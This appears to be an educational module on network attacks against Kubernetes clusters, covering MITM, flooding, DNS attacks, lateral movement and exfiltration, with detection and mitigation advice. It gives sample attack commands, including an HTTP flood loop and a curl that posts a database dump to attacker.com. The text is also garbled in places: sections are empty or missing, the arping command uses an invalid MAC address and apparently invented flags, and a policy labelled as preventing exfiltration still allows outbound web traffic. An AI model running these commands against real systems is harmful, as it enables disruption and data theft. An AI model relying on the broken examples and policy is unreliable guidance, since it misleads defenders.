# 01.09 - Network-Based Attacks

## 1️⃣ What This Topic Is

Network-Based Attacks examines how attackers exploit network vulnerabilities in Kubernetes environments, understanding network attack vectors, detection techniques, and mitigation strategies.

**What this means:**
- Network attacks = exploiting network protocols and services
- Attacker wants to intercept, modify, or disrupt network traffic
- Multiple network attack vectors exist in Kubernetes
- Understanding network attacks helps design secure network architecture

**The Key Concepts:**

1. **Network Attack Types**
   - Traffic interception (sniffing, MITM)
   - Network flooding (DoS, DDoS)
   - DNS attacks (cache poisoning, tunneling)
   - Lateral movement (moving between pods/nodes)
   - Data exfiltration (stealing data over network)

2. **Network Attack Vectors**
   - Unencrypted pod-to-pod traffic
   - Misconfigured network policies
   - Exposed services (NodePort, LoadBalancer)
   - Vulnerable network plugins (CNI)
   - DNS vulnerabilities (DNS spoofing, cache poisoning)

**Why this matters:**
- Network attacks enable lateral movement
- Network attacks enable data exfiltration
- Network attacks enable service disruption
- Understanding network attacks helps design secure network architecture

**Without understanding network attacks:**

**With understanding network attacks:**

### Problem 2: Lateral Movement Through Network

**Without understanding network attacks:**
- Can't detect if attacker is moving between pods
- Attacker can move from initial compromise to sensitive workloads
- Cluster-wide compromise occurs
- Data theft spreads across cluster

**With understanding network attacks:**
- Understand lateral movement vectors
- Can detect unauthorized pod-to-pod communication
- Can implement network segmentation
- Can contain breach to single namespace

### Problem 3: DNS Attacks

**Without understanding network attacks:**
- Can't detect DNS spoofing or cache poisoning
- Attacker can redirect traffic to malicious servers
- Data theft and command and control
- Service disruption

**With understanding network attacks:**
- Understand DNS attack vectors
- Can detect unusual DNS queries
- Can implement DNSSEC
- Can prevent DNS attacks

## 4️⃣ How It Works (Conceptual)

### Network-Based Attack Vectors

**1. Traffic Interception (MITM)**
- **Purpose**: Intercept and modify traffic between pods
- **Attacker Use**: Compromise network, use ARP spoofing, exploit vulnerable CNI
- **Detection Challenge**: MITM looks like legitimate network traffic
- **Example**: Attacker intercepts traffic between web server and database

**Attack Flow:**
```
Attacker compromises network → Attacker performs ARP spoofing → Attacker intercepts traffic between pods → Attacker modifies traffic → Attacker reads or modifies data → Data theft or command injection
```

**Detection:**
- Monitor for unusual network traffic patterns
- Monitor for ARP spoofing
- Monitor for traffic interception
- Use network monitoring tools

**Mitigation:**
- Implement service mesh with mTLS
- Use encrypted pod-to-pod communication
- Use network policies to restrict traffic
- Implement network segmentation

**Example**:
```bash
# Attacker performs ARP spoofing to intercept traffic
arping3 -t 1 -i u1000 --arpspoof --dmac 00:11:22:33:44:55 --smac 00:aa:bb:cc:dd:ee:ff
```

**2. Network Flooding (DoS/DDoS)**
- **Purpose**: Overwhelm network or services with traffic
- **Attacker Use**: Botnets to flood network, SYN floods, UDP floods
- **Detection Challenge**: DDoS traffic looks like legitimate traffic
- **Example**: Attacker floods API server with HTTP requests

**Attack Flow:**
```
Attacker uses botnet → Attacker floods API server with HTTP requests → API server overwhelmed → Services unavailable → DoS successful
```

**Detection:**
- Monitor for unusual request rates
- Monitor for suspicious source IPs
- Monitor for unusual network traffic patterns
- Use DDoS detection services

**Mitigation:**
- Use DDoS protection services (Cloudflare, AWS Shield, etc.)
- Implement rate limiting
- Use CDN to absorb traffic
- Use autoscaling to handle load

**Example**:
```bash
# Attacker floods API server with HTTP requests
for i in {1..100000}; do
  curl -X GET https://api.cluster.com/api/v1/pods &
done
```

**3. DNS Attacks**
- **Purpose**: Exploit DNS vulnerabilities to redirect traffic or poison cache
- **Attacker Use**: DNS spoofing, cache poisoning, DNS tunneling
- **Detection Challenge**: DNS attacks look like legitimate DNS queries
- **Example**: Attacker poisons Kubernetes DNS cache

**Attack Flow:**
```
Attacker compromises DNS server → Attacker performs cache poisoning → Kubernetes pods query poisoned DNS → Traffic redirected to attacker server → Data theft, command and control
```

**Detection:**
- Monitor for unusual DNS queries
- Monitor for DNS responses (unexpected IPs)
- Monitor for DNS cache poisoning attempts
- Use DNS monitoring tools

**Mitigation:**
- Implement DNSSEC
- Use secure DNS resolvers
- Monitor DNS traffic
- Implement DNS cache validation

**Example**:
```bash
# Attacker performs DNS cache poisoning
dig +short cluster.local @malicious-dns-server
# Returns attacker IP address for cluster.local
```

**4. Lateral Movement**
- **Purpose**: Move from compromised pod to other pods
- **Attacker Use**: Exploit network policies, use credentials, use network access
- **Detection Challenge**: Lateral movement looks like legitimate pod-to-pod communication
- **Example**: Attacker moves from web server to database

**Attack Flow:**
```
Attacker compromises web server pod → Attacker discovers database pod → Attacker accesses database pod via network → Attacker reads database data → Data theft, persistence
```

**Detection:**
- Monitor for unusual pod-to-pod communication
- Monitor for unexpected access to sensitive pods
- Monitor for lateral movement indicators
- Use network monitoring tools

**Mitigation:**
- Implement network policies (default-deny with explicit allow)
- Use network segmentation
- Use service mesh with mTLS
- Implement least privilege RBAC

**Example**:
```bash
# Attacker moves from web server to database
kubectl exec -it web-server-pod -- curl http://database-service:5432
# Accesses database data
```

**5. Data Exfiltration**
- **Purpose**: Steal data over network to attacker server
- **Attacker Use**: Large file transfers, encrypted tunnels, DNS tunneling
- **Detection Challenge**: Data exfiltration looks like legitimate network traffic
- **Example**: Attacker exfiltrates database backup

**Attack Flow:**
```
Attacker compromises database pod → Attacker reads database data → Attacker sends data to attacker server → Data theft → Compliance violation
```

**Detection:**
- Monitor for unusual network traffic (large outbound transfers)
- Monitor for connections to known C2 servers
- Monitor for encrypted tunnels (SSH, DNS)
- Use DLP (Data Loss Prevention) solutions

**Mitigation:**
- Implement network policies to restrict outbound traffic
- Use DLP solutions
- Monitor and alert on data exfiltration
- Implement encryption at rest and in transit

**Example**:
```bash
# Attacker exfiltrates database data
kubectl exec -it database-pod -- tar czf /data/backup.sql | curl -X POST -d @- http://attacker.com/exfiltrate
```

### Network Attack Detection Techniques

**1. Network Traffic Monitoring**
- Monitor for unusual traffic patterns
- Detect traffic interception (MITM)
- Detect large outbound transfers (data exfiltration)
- Detect connections to known C2 servers

**2. Lateral Movement Detection**
- Monitor for unusual pod-to-pod communication
- Detect unexpected access to sensitive pods
- Detect movements between namespaces
- Trace attacker movement through cluster

**3. DNS Monitoring**
- Monitor for unusual DNS queries
- Detect DNS spoofing
- Detect DNS cache poisoning
- Detect DNS tunneling

**4. DDoS Detection**
- Monitor for unusual request rates
- Detect SYN floods, UDP floods
- Detect volumetric attacks
- Use DDoS detection services

**5. Network Behavior Analysis**
- Monitor for network anomalies
- Detect abnormal traffic patterns
- Detect unauthorized access
- Identify potential threats

### **2. Applying Network Attack Mitigation**

**Example: Implementing Network Policies**

```bash
echo "=== Network Policy Implementation ==="

# 1. Create default-deny network policy
cat <<EOF | kubectl apply -f -
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: default-deny
  namespace: production
spec:
  podSelector: {}
  policyTypes: [Ingress, Egress]
EOF

# 2. Create specific allow policy for web server
cat <<EOF | kubectl apply -f -
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-web-to-database
  namespace: production
spec:
  podSelector:
    matchLabels:
      app: database
  policyTypes: [Ingress]
  ingress:
  - from:
    - podSelector:
        matchLabels:
          app: web-server
    ports:
    - protocol: TCP
      port: 5432
EOF

# 3. Create egress policy for data exfiltration prevention
cat <<EOF | kubectl apply -f -
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: prevent-data-exfiltration
  namespace: production
spec:
  podSelector:
    matchLabels:
      app: web-server
  policyTypes: [Egress]
  egress:
  - to:
    - ipBlock:
        cidr: 0.0.0.0/0
        except:
        - 10.0.0.0/8
  ports:
    - protocol: TCP
      port: 443
    - protocol: TCP
      port: 80
EOF

# 4. Verify network policies
kubectl get networkpolicies -n production
```

### **Common Mistakes in Network Attack Detection/Mitigation**

❌ **Mistake 1**: Not implementing network policies
- Reality: Without network policies, all traffic is allowed
- Fix: Implement default-deny with explicit allow

❌ **Mistake 2**: Not encrypting pod-to-pod traffic
- Reality: Unencrypted traffic can be intercepted
- Fix: Use service mesh with mTLS

❌ **Mistake 3**: Not monitoring DNS
- Reality: DNS attacks are common and hard to detect
- Fix: Implement DNS monitoring, use DNSSEC

❌ **Mistake 4**: Not monitoring for data exfiltration
- Reality: Data exfiltration looks like legitimate traffic
- Fix: Implement DLP, monitor large outbound transfers
